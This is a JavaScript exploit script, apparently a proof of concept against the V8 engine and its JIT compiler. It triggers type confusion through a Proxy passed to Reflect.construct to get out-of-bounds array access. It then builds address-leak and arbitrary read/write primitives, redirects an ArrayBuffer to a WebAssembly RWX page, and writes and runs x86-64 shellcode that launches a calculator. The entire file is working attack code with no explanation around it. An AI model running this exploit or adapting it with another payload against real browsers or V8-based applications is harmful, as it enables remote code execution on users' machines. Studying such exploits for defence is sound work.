var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}
function itof(val) { // typeof(val) = BigInt
	u64_buf[0] = Number(BigInt(val) & 0xffffffffn);
	u64_buf[1] = Number(BigInt(val) >> 32n);
	return f64_buf[0];
}
function hex(val){
	return "0x"+val.toString(16)
}

function assert(a){
	if(a){
		return;
	}
	throw "error"
}

function print(){}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var sh = wasm_instance.exports.main;

let a = [0.1, ,,,,,,,,,,,,,,,,,,,,,, 6.1, 7.1, 8.1];

a.pop();
a.pop();
a.pop();

function empty() {}

function f(p) {
	a.push(typeof(Reflect.construct(empty, arguments, p)) === Proxy ? 0.2 : 7.210148e-317);
	for (var i = 0; i < 0x10000; ++i) {};
}

let p = new Proxy(Object, {
	get: function() {
		a[0] = {};
		oob = [0.2, 1.2, 2.2, 3.2, 4.3];
		addr=[0x1234,0x1234,0x2468,0x2468,{}]//grep 2468
		AARW_c=[1.1,2.2,3.3];
		NOT_GC=new Uint32Array(0x8);//TypedArray 
		AARW = new ArrayBuffer(0xceed);
		return Object.prototype;
	}
});

function main(o) {
	for (var i = 0; i < 0x10000; ++i) {};
	return f(o);
}


//addr=[0x1234,0x1357,{}]
for (var i = 0; i < 0x10000; ++i) {empty();}

main(empty);
main(empty);
main(p);

console.log(a)

go=oob.length;
// assert(go>0xdead)
for(addr_idx=0;addr_idx<go;addr_idx++){
	tmp=oob[addr_idx]
	if(tmp){
		print(addr_idx+" = "+hex(ftoi(tmp)))
	}
	if (ftoi(oob[addr_idx])==0x246800002468){
	            if (ftoi(oob[addr_idx+1])==0x48d0000048d0){
	                    print("addr idx found!!  "+addr_idx);
	                    break;
	            }
	    }


}


for(idx=0;idx<0x1000;idx++){
	tmp = ftoi(oob[idx])%(2n**32n)
	if(tmp==7){
		break
	}
}


isolate = (ftoi(oob[idx])/0x100000000n)*0x100000000n
print("isolate = "+hex(isolate))


addr[0]=wasm_instance


RWX_ptr = ftoi(oob[addr_idx])
RWX_ptr = isolate+RWX_ptr%0x100000000n+0x68n-1n
print("RWX_ptr = "+hex(RWX_ptr))


for(idx=0;idx<0x1000;idx++){
        tmp = ftoi(oob[idx])%(2n**32n)
        if(tmp==0xceed){
                break
        }
}

backingstore_idx=idx+1

oob[backingstore_idx]=itof(RWX_ptr);
view = new DataView(AARW)
RWX_1=view.getUint32(0,true)//AARW
RWX_2=view.getUint32(4,true)
RWX_2 = RWX_2* 0x100000000
RWX = RWX_1+RWX_2
print("RWX_1 = "+hex(RWX_1))
print("RWX_2 = "+hex(RWX_2))
print("RWX = "+hex(RWX))

oob[backingstore_idx]=itof(RWX);

shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];


for(i=0;i<shellcode.length;i++){
        view.setUint32(i*4,shellcode[i],true);
}
sh()
assert('error')